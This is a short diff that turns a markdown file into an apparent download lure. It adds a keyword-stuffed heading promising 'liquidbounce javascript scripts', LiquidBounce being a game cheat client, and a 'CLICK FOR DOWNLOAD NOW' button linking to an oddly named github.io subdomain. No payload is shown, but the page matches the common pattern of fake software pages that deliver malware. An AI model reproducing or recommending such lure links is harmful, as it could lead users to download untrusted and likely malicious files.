@@ -1,10 +1,10 @@
-
+# download liquidbounce javascript scripts for PC | official latest version liquidbounce javascript scripts. Explore details about features, configs, and installation.
 
 
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://liquidbounce-javascrip-hz69.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
